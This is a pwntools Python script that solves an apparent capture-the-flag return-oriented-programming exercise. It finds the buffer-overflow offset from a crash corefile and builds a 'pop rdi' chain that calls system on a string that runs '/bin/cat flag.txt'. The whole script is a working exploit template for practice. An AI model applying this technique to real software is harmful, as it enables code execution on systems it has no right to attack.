from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('rop2')

# Enable verbose logging so we can see exactly what is being sent.
context.log_level = 'debug'

# Figure out how big of an overflow we need by crashing the
# process once.
io = process(elf.path)

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("stack address at crash time: %#x", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)
padding_length=cyclic_find(pattern)

rop = ROP(elf.path)
info("rdi gadgets found: %#s",rop.rdi)  #Gadget(0x4007c3, ['pop rdi', 'ret'], ['rdi'], 0x10)
pop_rdi_addr=rop.rdi.address
info("gadget address: %#x", pop_rdi_addr)

command_addr=elf.symbols['usefulString'] # /bin/cat flag.txt

# Craft a new payload which puts the "target" address at the correct offset
payload = b"A"*padding_length+p64(pop_rdi_addr)+p64(command_addr)+p64(elf.symbols['system'])
print(payload)

# pwntools can build our rop chain for us
rop.raw(pop_rdi_addr) # pop rdi; ret
rop.raw(elf.symbols['usefulString']) # address for usefulString
rop.raw(elf.symbols['system']) # address for syscall
print (rop.dump())
payload = b"A"*padding_length + rop.chain()
print(payload) #exactly equals!
#
## inject our needed A's and then build the ropchain
#exploit += 'B' * (0x60 - len(exploit))

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
# io.stream()
io.recvall()
#io.recvuntil("Here's your flag:")

# Get our flag!
#flag = io.recvline()
#success(flag)